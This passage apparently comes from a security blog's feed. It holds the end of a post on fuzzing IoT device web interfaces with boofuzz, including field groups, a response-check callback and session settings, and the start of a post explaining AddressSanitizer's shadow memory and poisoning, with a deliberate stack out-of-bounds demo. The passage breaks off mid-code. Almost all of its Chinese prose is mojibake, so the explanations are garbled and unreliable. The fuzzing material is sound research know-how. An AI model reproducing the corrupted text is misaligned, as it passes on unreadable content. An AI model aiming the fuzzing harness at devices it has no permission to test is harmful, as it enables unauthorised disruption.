AX3å°æŒ–äº†ä¸€æ‰‹ï¼Œå¯¹å†å²æ¼æ´è‡ªç„¶æ˜¯èƒ½å¾ˆå¿«çš„å®šä½ã€‚ä½†æ˜¯ï¼Œå¦‚æœé¢å¯¹ä¸€ä¸ªæ–°è®¾å¤‡ï¼Œä¸åŒçš„åŠŸèƒ½å‡½æ•°æ¥å£æœ‰å‡ åä¸ªï¼Œä¸”ä¸åŒåŠŸèƒ½å¯¹åº”çš„å‚æ•°ä¹Ÿä¸åŒï¼Œè¿™æ—¶fuzzçš„æ•ˆç‡å°±å¾ˆä»¤äººè´¨ç–‘ã€‚</p><p>äºæ˜¯ç¬”è€…ä¾¿è®¾ç½®äº†3ç»„groupï¼Œæ¯ç»„groupä¸­è®¾ç½®äº†5ä¸ªå‚æ•°ï¼Œå°†ä¸Šé¢åˆ©ç”¨è¿‡çš„æ¼æ´æ”¾å…¥å…¶ä¸­ï¼Œç±»ä¼¼</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs lisp">s_group(<span class="hljs-string">&quot;url&quot;</span>,[&#x27;url1&#x27;,&#x27;url2&#x27;,&#x27;url3&#x27;,&#x27;url4&#x27;,&#x27;url5&#x27;])<br>s_group(<span class="hljs-string">&quot;key1&quot;</span>,[arg1&#x27;,&#x27;arg2&#x27;,&#x27;arg3&#x27;,&#x27;arg4&#x27;,&#x27;arg5&#x27;]) <br>s_static(<span class="hljs-string">&quot;=&quot;</span>)<br>s_string(<span class="hljs-string">&quot;korey0sh1&quot;</span>, max_len=0x1000,fuzzable=True)<br>s_static(<span class="hljs-string">&quot;&amp;&quot;</span>)<br>s_group(<span class="hljs-string">&quot;key2&quot;</span>,[&#x27;arg1&#x27;,&#x27;arg2&#x27;,&#x27;arg3&#x27;,&#x27;arg4&#x27;,&#x27;arg5&#x27;])<br>s_static(<span class="hljs-string">&quot;=&quot;</span>)<br>s_string(<span class="hljs-string">&quot;korey0sh1&quot;</span>, max_len=0x1000,fuzzable=True)<br></code></pre></td></tr></table></figure><p>ä½†ä¸å¹¸çš„æ˜¯ï¼Œè·‘äº†5ã€6ä¸ªå°æ—¶ï¼Œå¿«100ä¸‡æ¡caseï¼Œè¿˜æ˜¯æ²¡è·‘å‡ºæ¥</p><p>ä¸”å°±ç®—è·‘å‡ºcrashï¼Œä¹Ÿåªæ˜¯å¤§è‡´æ¼æ´å®šä½ï¼Œå…·ä½“çš„pocè¿˜æ˜¯å¾—äººå·¥ä»”ç»†å®¡ã€‚</p><h1 id="0x2-ä¸€äº›æ€¨æ°”ç¢ç¢å¿µ"><a href="#0x2-ä¸€äº›æ€¨æ°”ç¢ç¢å¿µ" class="headerlink" title="0x2: ä¸€äº›æ€¨æ°”ç¢ç¢å¿µ"></a>0x2: ä¸€äº›æ€¨æ°”ç¢ç¢å¿µ</h1><h2 id="ç¥å¥‡çš„callback"><a href="#ç¥å¥‡çš„callback" class="headerlink" title="ç¥å¥‡çš„callback"></a>ç¥å¥‡çš„callback</h2><p>å› ä¸ºå‘ç°DoSåpyç¨‹åºå¹¶ä¸èƒ½åœæ­¢ï¼Œè¿˜æ˜¯ä¼šä¸åœå°è¯•è¿æ¥ï¼Œäºæ˜¯ä¾¿æŠ„äº†ä¸€ä¸ªcallbackæ¿å­æ ¹æ®httpçš„å›æ˜¾æ¥åˆ¤æ–­æœåŠ¡æ˜¯å¦åœæ­¢</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs cmake">def check_response(<span class="hljs-keyword">target</span>, fuzz_data_logger, session, *args, **kwargs):<br>    <span class="hljs-comment"># callback</span><br>    fuzz_data_logger.log_info(<span class="hljs-string">&quot;Checking this response...&quot;</span>)<br>    fuzz_data_logger.log_info(<span class="hljs-string">&quot;We will receive 512 bytes data...&quot;</span>)<br>    try:<br>        response = <span class="hljs-keyword">target</span>.recv(<span class="hljs-number">512</span>)<br>    except:<br>        fuzz_data_logger.log_fail(<span class="hljs-string">&quot;Unable to connect to target. Closing...&quot;</span>)<br>        <span class="hljs-keyword">target</span>.close()              <span class="hljs-comment"># close this target (fuzzer&#x27;s thread)</span><br>        <span class="hljs-keyword">return</span><br>    <span class="hljs-comment"># if empty response</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> response:<br>        fuzz_data_logger.log_fail(<span class="hljs-string">&quot;Empty response, target may be hung. Closing...&quot;</span>)<br>        <span class="hljs-keyword">target</span>.close()<br>        <span class="hljs-keyword">return</span><br>    fuzz_data_logger.log_info(<span class="hljs-string">&quot;response check...\n&quot;</span> + response.decode())<br>    <span class="hljs-keyword">target</span>.close()<br>    <span class="hljs-keyword">return</span><br></code></pre></td></tr></table></figure><p>ç»“æœå‘ç°æˆ‘POSTéƒ½æ²¡å‘é€å‘¢ä½ å…ˆæ‰§è¡Œcallbackäº†ï¼Œäºæ˜¯ä¹æ•´ä¸ªç¨‹åºåœ¨case 1å°±ç›´æ¥downæ‰äº†</p><p><img src="/img/Fuzz1/3.png" alt="img"></p><p>æˆ‘æ˜¯SBï¼Œæˆ‘çœŸnmæ˜¯SBï¼ŒğŸ˜â€”â€”&gt;ğŸ¤¡</p><p>åŸæ¥æˆ‘ä»¥ä¸ºcallbackæ˜¯æ”¾session.connecté‡Œçš„ï¼Œç»“æœè¦æ”¾åˆ°sessioné‡Œå°±å¥½äº†ï¼Œæˆ‘çœŸTMæ˜¯ä¸ªSBå•Š</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs routeros">session.connect(s_get(<span class="hljs-string">&quot;Request&quot;</span>),<span class="hljs-attribute">callback</span>=check_response)<br>                          |<br>                          |<br>                          |<br>                         \ /<br>session = Session(<br>        <span class="hljs-attribute">target</span>=Target(<br>            <span class="hljs-attribute">connection</span>=SocketConnection(host,port,proto=&#x27;tcp&#x27;),<br>        ),<br>        post_test_case_callbacks=[check_response],<br>        <span class="hljs-attribute">receive_data_after_fuzz</span>=<span class="hljs-literal">False</span>,  #è¿™ä¸ªä¸€å®šè¦å…³æ‰ï¼Œä¸ç„¶callbacké‚£ä¸ªrecvå°±ä¼šå‡ºé—®é¢˜<br>        <span class="hljs-attribute">ignore_connection_reset</span>=<span class="hljs-literal">True</span>,<br>        <span class="hljs-attribute">restart_sleep_time</span>=10,<br>        <span class="hljs-attribute">crash_threshold_element</span>=1,<br>    )<br></code></pre></td></tr></table></figure><h2 id="ç¥å¥‡çš„monitor"><a href="#ç¥å¥‡çš„monitor" class="headerlink" title="ç¥å¥‡çš„monitor"></a>ç¥å¥‡çš„monitor</h2><p>boofuzz åªæä¾›äº†ä¸‰ç§ monitorï¼š</p><p>ProcessMonitor å¤§æ¦‚æ˜¯å’Œ Procman è¿›è¡Œ rpc é€šè®¯æ¥ç›‘æ§ï¼›</p><p>NetworkMonitor å…·ä½“ç”¨æ³•ä¸å¤ªæ¸…æ¥šï¼Œçœ‹æ–‡æ¡£é‡Œè¯´ç”¨äº† wiresharkï¼Œubuntuæ²¡è£…wiresharkï¼Œhai</p><p>CallbackMonitor æ˜¯é»˜è®¤çš„ Monitorï¼Œæä¾›å›è°ƒå‡½æ•°çš„åŠŸèƒ½ï¼Œå°±æ˜¯å‰é¢å“ªä¸ªcallback</p><p>ç„¶åç¬”è€…è¯•äº†process monitorï¼Œç»“æœè·‘ä¸èµ·æ¥ä¸€ç‚¹ï¼Œåæ¥ä¸€æƒ³process monitorä¹Ÿä¸æ€ä¹ˆé‡è¦ï¼Œå®åœ¨ä¸è¡Œç”¨gdbserveræ‹¿caseä¸€è·‘å°±è¡Œäº†</p><h2 id="ç¥å¥‡çš„log"><a href="#ç¥å¥‡çš„log" class="headerlink" title="ç¥å¥‡çš„log"></a>ç¥å¥‡çš„log</h2><p>æƒ³æŠŠæ¯ä¸ªcaseéƒ½å†™è¿›æ–‡ä»¶ï¼Œåˆ°æ—¶å€™æ‰“expæ‹¿payloadä¼šæ–¹ä¾¿ã€‚ç»“æœé—®gptå…¨æ˜¯é”™çš„ï¼Œåæ¥æ€»ç®—æ‰¾åˆ°äº†ä¸€ä¸ªæŠŠlogå†™è¿›.csvæ–‡ä»¶çš„æ–¹æ³•</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs routeros">session = Session(<br>        <span class="hljs-attribute">target</span>=Target(<br>            <span class="hljs-attribute">connection</span>=SocketConnection(host,port,proto=&#x27;tcp&#x27;),<br>        ),<br>        post_test_case_callbacks=[check_response],<br>        <span class="hljs-attribute">receive_data_after_fuzz</span>=<span class="hljs-literal">False</span>,<br>        <span class="hljs-attribute">ignore_connection_reset</span>=<span class="hljs-literal">True</span>,<br>        <span class="hljs-attribute">restart_sleep_time</span>=10,<br>        <span class="hljs-attribute">crash_threshold_element</span>=1,<br>        <span class="hljs-attribute">fuzz_loggers</span>=my_logger<br>    )<br></code></pre></td></tr></table></figure><h2 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h2><p>å¯¹äºæŸäº›è¦å…ˆç™»å½•çš„è®¾å¤‡ï¼Œå¯ä»¥è¿™ä¹ˆå†™</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-tag">session</span><span class="hljs-selector-class">.connect</span>(<span class="hljs-built_in">s_get</span>(<span class="hljs-string">&#x27;login&#x27;</span>))     # é»˜è®¤å‰ç½®èŠ‚ç‚¹ä¸º<span class="hljs-selector-tag">root</span><br><span class="hljs-selector-tag">session</span><span class="hljs-selector-class">.connect</span>(<span class="hljs-built_in">s_get</span>(<span class="hljs-string">&#x27;login&#x27;</span>), <span class="hljs-built_in">s_get</span>(action1&#x27;), callback=add_auth_callback)<br><span class="hljs-selector-tag">session</span><span class="hljs-selector-class">.connect</span>(<span class="hljs-built_in">s_get</span>(<span class="hljs-string">&#x27;login&#x27;</span>),<span class="hljs-built_in">s_get</span>(<span class="hljs-string">&#x27;action2&#x27;</span>), callback=add_auth_callback)<br><span class="hljs-selector-tag">session</span><span class="hljs-selector-class">.connect</span>(<span class="hljs-built_in">s_get</span>(<span class="hljs-string">&#x27;login&#x27;</span>),<span class="hljs-built_in">s_get</span>(<span class="hljs-string">&#x27;action3&#x27;</span>), callback=add_auth_callback)<br></code></pre></td></tr></table></figure><h1 id="0x3-æœ€åçš„æœ€å"><a href="#0x3-æœ€åçš„æœ€å" class="headerlink" title="0x3: æœ€åçš„æœ€å"></a>0x3: æœ€åçš„æœ€å</h1><p>æœ‰å¤±æœ›ï¼Œæˆ–è®¸å§ï¼Œå¼€å§‹å­¦Iotçš„æ—¶å€™ä¸€ç›´æƒ³å¯»æ‰¾ä¸€ä¸ªèƒ½å…¨è‡ªåŠ¨åŒ–å›ºä»¶æ¨¡æ‹Ÿï¼Œæ¼æ´åˆ†æçš„å·¥å…·ï¼Œç„¶è€Œï¼Œæƒ³æƒ³å°±æœ‰ç‚¹ä¸å¤ªç°å®ï¼ˆä½†Shamblesè¿™ä¸œè¥¿æ„Ÿå…´è¶£çš„å¸ˆå‚…å¯ä»¥äº†è§£ä¸‹ï¼Œé“¸å¸ç¬”è€…å› ä¸ºå®åœ¨å¤ªç©·ä¸æ˜¯å¾ˆäº†è§£ï¼Œä½†æ„Ÿè§‰å¾ˆdiaoçš„æ ·å­ï¼Œmdå¿«6ä½æ•°ä¸€å¹´çš„è´¹ç”¨æƒ³æƒ³å°±ææ€–ï¼‰ã€‚</p><p>ç°åœ¨æˆ‘å¯èƒ½ä¼šå€¾å‘äºç”¨FirmAEã€fatã€fapè¿™äº›æ¨¡æ‹Ÿä¸€éç„¶åå†ç”¨qemuè¿›è¡Œæ‰‹åŠ¨éªŒè¯å§ï¼Œå½“ç„¶æœ‰çœŸæœºèƒ½å®æ“é‚£å°±å¤ªæ£’äº†ã€‚</p><p>æ‰¯è¿œäº†ï¼Œå‰å‡ å¤©è§‰å¾—AFLå¯¹è¿™äº›é—­æºçš„å›ºä»¶ç”¨å¤„ä¸æ˜¯å¾ˆå¤§ï¼Œç°åœ¨çœ‹æ¥boofuzzçš„ä½œç”¨ä¹Ÿæœ‰é™ï¼ŒğŸ˜‚</p><p>å¯èƒ½è¿‡å‡ å¤©ä¼šçœ‹çœ‹FirmAFLï¼Œå¥½åƒæ‰‹ä¸Šè¿˜æœ‰ä¸€ç¯‡å¯¹åº”è®ºæ–‡æ¥ç€ã€‚</p><p>ç¿»å‡ºæ¥äº†ä¸‰ä¸ªæœˆå‰æƒ³å…¥é—¨Iotæ—¶å’ŒIotç•Œçš„ä¼ è¯´çš„èŠå¤©è®°å½•</p><p><img src="/img/Fuzz1/0.jpg" alt="img"></p>]]></content>
    
    
    <categories>
      
      <category>Fuzz</category>
      
    </categories>
    
    
    <tags>
      
      <tag>fuzzã€Iot</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Address Sanitizer(æŠ•æ¯’ï¼ŸæŠ•æ¯’ï¼)</title>
    <link href="/2023/08/06/ASAN/"/>
    <url>/2023/08/06/ASAN/</url>
    
    <content type="html"><![CDATA[<h1 id="0x0-å†™åœ¨æ‰€æœ‰ä¹‹å‰"><a href="#0x0-å†™åœ¨æ‰€æœ‰ä¹‹å‰" class="headerlink" title="0x0: å†™åœ¨æ‰€æœ‰ä¹‹å‰"></a>0x0: å†™åœ¨æ‰€æœ‰ä¹‹å‰</h1><p>ç¬”è€…åœ¨Fuzz101é¡¹ç›®ä¸­ï¼Œé‡åˆ°äº†ASANï¼ˆAddress Sanitizerï¼‰è¿™ä¸ªå†…å­˜é”™è¯¯æ£€æµ‹å·¥å…·ï¼Œæ„Ÿè§‰æŒºå·§å¦™çš„ã€‚</p><p>è¿™è¾¹å°±æµ…æµ…çš„è®°å½•ä¸€ä¸‹</p><h1 id="0x1-What-is-it"><a href="#0x1-What-is-it" class="headerlink" title="0x1: What is it?"></a>0x1: What is it?</h1><p>ASANï¼ˆAddress Sanitizerï¼‰æ˜¯googleå¼€å‘çš„ä¸€ä¸ªé’ˆå¯¹C&#x2F;C++çš„é«˜æ•ˆç‡çš„å†…å­˜é”™è¯¯æ£€æµ‹å·¥å…·</p><p>å®ƒå¯ä»¥æ£€æµ‹ä»¥ä¸‹ç±»å‹çš„æ¼æ´</p><ul><li>stack buffer overflow</li><li>heap buffer overflow</li><li>global buffer overflow</li><li>use after free</li><li>use after return</li><li>use after scope</li><li>memory leak</li><li>initialization order bugs</li></ul><p>åŒæ—¶ï¼ŒASANè¿˜æ”¯æŒx86ã€x68_64ã€mipsã€armã€powerpcç­‰å¤šç§æ¶æ„</p><p>å¯ä»¥è¯´ï¼Œå¥½ç”¨çš„ä¸€æ‰¹</p><h2 id="é‚£å®ƒæ˜¯æ€ä¹ˆåšåˆ°çš„å˜"><a href="#é‚£å®ƒæ˜¯æ€ä¹ˆåšåˆ°çš„å˜" class="headerlink" title="é‚£å®ƒæ˜¯æ€ä¹ˆåšåˆ°çš„å˜"></a>é‚£å®ƒæ˜¯æ€ä¹ˆåšåˆ°çš„å˜</h2><p>å› ä¸ºæ˜¯å†…å­˜æ£€æµ‹å·¥å…·ï¼Œæ‰€ä»¥è¦åšåˆ°å…¨é¢çš„æ£€æŸ¥ï¼Œå°±è¦å¯¹æ¯æ¬¡çš„å†…å­˜è¯»&#x2F;å†™åŠå…¶ä»–æ“ä½œè¿›è¡Œç›‘æµ‹</p><p>ç¬”è€…åˆšå¼€å§‹çš„æ—¶å€™è§‰å¾—ASANå¯èƒ½æ˜¯canaryä¿æŠ¤çš„plusplusç‰ˆæœ¬ï¼Œåæ¥æ‰çŸ¥é“ASANé€šè¿‡ä¸€ä¸ªç¼–è¯‘å™¨æ£€æµ‹æ¨¡å—å’Œä¸€ä¸ªåŠ«æŒå†…å­˜æ“ä½œå‡½æ•°ï¼ˆä¾‹å¦‚malloc&#x2F;freeï¼‰çš„run-timeåº“æ¥å¯¹å†…å­˜è¿›è¡Œç›‘æµ‹ã€‚</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">Before:</span><br><span class="hljs-keyword"></span>*<span class="hljs-keyword">address </span>= ...<span class="hljs-comment">;  // or: ... = *address;</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">After:</span><br>if (IsPoisoned(<span class="hljs-keyword">address)) </span>&#123;<br>  ReportError(<span class="hljs-keyword">address, </span>kAccessSize, kIsWrite);<br>&#125;<br>*<span class="hljs-keyword">address </span>= ...<span class="hljs-comment">;  // or: ... = *address;</span><br></code></pre></td></tr></table></figure><h3 id="Shadow-Memory"><a href="#Shadow-Memory" class="headerlink" title="Shadow Memory"></a>Shadow Memory</h3><p>å½±å­å†…å­˜ï¼Œä½äºè™šæ‹Ÿåœ°å€ç©ºé—´çš„ä¸­é—´ï¼ˆå› ä¸ºå †æ ˆåœ¨ä¸¤å¤´ï¼‰,æ˜¯ç”¨æ¥è®°å½•ä¸»ç¨‹åºçš„å†…å­˜æ˜¯å¦å¯ç”¨çš„å†…å­˜åŒºåŸŸï¼Œè¿™æ˜¯ASANçš„ç‰¹æœ‰äº§ç‰©ã€‚</p><p>ä¸»ç¨‹åºçš„å†…å­˜æŒ‰ç…§8å­—èŠ‚å¯¹é½ï¼Œè€Œ8ä¸ªå­—èŠ‚åœ¨å½±å­å†…å­˜ä¸­å¯¹åº”çš„åŒºåŸŸä¸ºä¸€ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥ä¸»ç¨‹åºå†…å­˜ ï¼šå½±å­å†…å­˜&#x3D;8 ï¼š1ã€‚</p><p>å½±å­å†…å­˜æ— æ³•åœ¨ä¸»ç¨‹åºä¸­è¢«è¯»å†™ï¼Œåªæœ‰é€šè¿‡ç¼–è¯‘å™¨ç›¸å…³ä»£ç æ‰å¯è®¿é—®</p><p>åœ¨æ¯æ¬¡å¯¹å†…å­˜è¿›è¡Œè¯»å†™æ“ä½œæ—¶ï¼Œéƒ½ä¼šè¯»å–å¯¹åº”çš„å½±å­å†…å­˜æ£€æŸ¥å…¶åˆæ³•æ€§</p><p>å½±å­å†…å­˜çš„è®¡ç®—å…¬å¼å¦‚ä¸‹ï¼š</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-number">64</span>-bit<br>Shadow = (Mem &gt;&gt; <span class="hljs-number">3</span>) + <span class="hljs-number">0x7fff8000</span><span class="hljs-comment">;</span><br><br>[<span class="hljs-number">0x10007fff8000</span>, <span class="hljs-number">0x7fffffffffff</span>]HighMem<br>[<span class="hljs-number">0x02008fff7000</span>, <span class="hljs-number">0x10007fff7fff</span>]HighShadow<br>[<span class="hljs-number">0x00008fff7000</span>, <span class="hljs-number">0x02008fff6fff</span>]ShadowGap<br>[<span class="hljs-number">0x00007fff8000</span>, <span class="hljs-number">0x00008fff6fff</span>]LowShadow<br>[<span class="hljs-number">0x000000000000</span>, <span class="hljs-number">0x00007fff7fff</span>]LowMem<br><br><span class="hljs-number">32</span>-bit<br>Shadow = (Mem &gt;&gt; <span class="hljs-number">3</span>) + <span class="hljs-number">0x20000000</span><span class="hljs-comment">;</span><br><br>[<span class="hljs-number">0x40000000</span>, <span class="hljs-number">0xffffffff</span>]HighMem<br>[<span class="hljs-number">0x28000000</span>, <span class="hljs-number">0x3fffffff</span>]HighShadow<br>[<span class="hljs-number">0x24000000</span>, <span class="hljs-number">0x27ffffff</span>]ShadowGap<br>[<span class="hljs-number">0x20000000</span>, <span class="hljs-number">0x23ffffff</span>]LowShadow<br>[<span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x1fffffff</span>]LowMem<br><br>ultra compact shadow<br>Shadow = (Mem &gt;&gt; <span class="hljs-number">7</span>) | kOffset<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><h3 id="Sanitizer-æŠ•æ¯’"><a href="#Sanitizer-æŠ•æ¯’" class="headerlink" title="Sanitizer æŠ•æ¯’"></a>Sanitizer æŠ•æ¯’</h3><p>æˆ‘è§‰å¾—å¯èƒ½ç”¨å¤§å®¶éƒ½ç©è¿‡çš„æ¸¸æˆâ€”â€”<strong>æ‰«é›·</strong>è¿›è¡Œç±»æ¯”ï¼Œä¼šæ›´å¥½ç†è§£ã€‚</p><p>å¦‚æœæˆ‘ä»¬æƒ³è¦æ ‡è®°ä¸€ä¸ªåŒºåŸŸå·²ç»è¢«ä½¿ç”¨ï¼Œé‚£ä¹ˆå°±åœ¨è¿™å—å†…å­˜å¯¹åº”çš„Shadow MemoryåŸ‹é›·ï¼Œä¸€æ—¦å†æ¬¡å¯¹æ­¤åŒºåŸŸè¿›è¡Œè¯»å†™æ“ä½œï¼Œå°±ä¼šè§¦å‘é‚£é¢—â€œé›·â€œï¼Œä»è€Œé€ æˆcrashã€‚</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">shadow_address </span>= MemToShadow(<span class="hljs-keyword">address);</span><br><span class="hljs-keyword"></span>if (<span class="hljs-keyword">ShadowIsPoisoned(shadow_address)) </span>&#123;<br>  ReportError(<span class="hljs-keyword">address, </span>kAccessSize, kIsWrite);<br>&#125;<br></code></pre></td></tr></table></figure><p>å½“ç„¶ï¼Œè¿™åªæ˜¯ä¸¾ä¸ªä¾‹å­ã€‚ä¸åŒçš„æ¼æ´æ‰€å¯¹åº”çš„<strong>â€æ‰«é›·â€œ</strong>ç­–ç•¥ä¹Ÿä¸åŒã€‚</p><p>æ¯ä¸ªå½±å­å†…å­˜å¯¹åº”çš„å¯èƒ½å€¼æœ‰9ä¸ªï¼š</p><ul><li>å½“å…¶å¯¹åº”çš„å†…å­˜8ä¸ªå­—èŠ‚éƒ½æœªè¢«æŠ•æ¯’ï¼Œvalue&#x3D;0</li><li>å½“å…¶å¯¹åº”çš„å†…å­˜8ä¸ªå­—èŠ‚éƒ½è¢«æŠ•æ¯’ï¼Œvalue&#x3D;è´Ÿæ•°</li><li>å½“å…¶å¯¹åº”å¾—å†…å­˜æœ‰kä¸ªå­—èŠ‚è¢«æŠ•æ¯’ï¼Œvalue&#x3D;8-k</li></ul><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-type">byte</span> *shadow_address = <span class="hljs-built_in">MemToShadow</span>(address);<br><span class="hljs-type">byte</span> shadow_value = *shadow_address;<br><span class="hljs-keyword">if</span> (shadow_value) &#123;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-built_in">SlowPathCheck</span>(shadow_value, address, kAccessSize)) &#123;<br>    <span class="hljs-built_in">ReportError</span>(address, kAccessSize, kIsWrite);<br>  &#125;<br>&#125;<br><span class="hljs-comment">// Check the cases where we access first k bytes of the qword</span><br><span class="hljs-comment">// and these k bytes are unpoisoned.</span><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">SlowPathCheck</span><span class="hljs-params">(shadow_value, address, kAccessSize)</span> </span>&#123;<br>  last_accessed_byte = (address &amp; <span class="hljs-number">7</span>) + kAccessSize - <span class="hljs-number">1</span>;<br>  <span class="hljs-keyword">return</span> (last_accessed_byte &gt;= shadow_value);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Report-Error"><a href="#Report-Error" class="headerlink" title="Report Error"></a>Report Error</h3><p><code>ReportError</code> å¯ä»¥è¢«å®ç°ä¸ºä¸€ä¸ªè°ƒç”¨ï¼ˆè¿™æ˜¯é»˜è®¤æ–¹å¼ï¼‰ï¼Œä½†è¿˜æœ‰ä¸€äº›å…¶ä»–ç¨å¾®æ›´æœ‰æ•ˆç‡å’Œ&#x2F;æˆ–æ›´ç´§å‡‘çš„è§£å†³æ–¹æ¡ˆã€‚åœ¨æŸä¸ªæ—¶å€™ï¼Œé»˜è®¤è¡Œä¸ºæ˜¯ï¼š</p><p>å°†å¤±è´¥åœ°å€å¤åˆ¶åˆ° %raxï¼ˆ%eaxï¼‰ã€‚<br>æ‰§è¡Œ ud2 æŒ‡ä»¤ï¼ˆç”Ÿæˆ SIGILL ä¿¡å·ï¼‰ã€‚<br>åœ¨ ud2 åçš„ä¸€ä¸ªå­—èŠ‚æŒ‡ä»¤ä¸­ç¼–ç è®¿é—®ç±»å‹å’Œå¤§å°ã€‚æ€»ä½“ä¸Šï¼Œè¿™ä¸‰æ¡æŒ‡ä»¤éœ€è¦ 5-6 å­—èŠ‚çš„å­—èŠ‚ç ã€‚<br>ä¹Ÿå¯ä»¥åªä½¿ç”¨å•ä¸ªæŒ‡ä»¤ï¼ˆä¾‹å¦‚ ud2ï¼‰ï¼Œä½†è¿™å°†éœ€è¦åœ¨è¿è¡Œæ—¶åº“ä¸­æ‹¥æœ‰ä¸€ä¸ªå®Œæ•´çš„åæ±‡ç¼–å™¨ï¼ˆæˆ–å…¶ä»–ä¸€äº›æŠ€å·§ï¼‰ã€‚</p><h3 id="å®ç°"><a href="#å®ç°" class="headerlink" title="å®ç°"></a>å®ç°</h3><p>é€šè¿‡IDAè¿›è¡Œåˆ†æå¯ä»¥å¾ˆç›´è§‚çš„çœ‹åˆ°ASANçš„è¡Œä¸º</p><p>å°å†™ä¸€ä¸ªdemo</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">char</span> stack1[<span class="hljs-number">0x10</span>];<br>  <br>  <span class="hljs-keyword">return</span> stack1[<span class="hljs-number">0x10</span>];<br>&#125;<br>  <br></code></pre></td></tr></table></figure><p>ç¼–è¯‘</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">gcc -g -fsanitize=address ./stack.c -o ./stack<br></code></pre></td></tr></table></figure><p><img src="/img/ASAN/0.png" alt="img"></p><p>è¿™é‡Œé¢å…¶å®å¯ä»¥å¾ˆæ¸…æ¥šçš„çœ‹åˆ°mem memoryå’Œshadow memoryä¹‹é—´çš„æ¢ç®—ä»¥åŠReport Errorçš„è°ƒç”¨</p><p>è‡³äºæ±‡ç¼–å±‚é¢çš„ï¼Œç¬”è€…åœ¨è¿™è¾¹è´´å‡º<a href="https://github.com/google/sanitizers/wiki/AddressSanitizerAlgorithm">å®˜æ–¹æ–‡æ¡£</a>ä¸­çš„example</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span 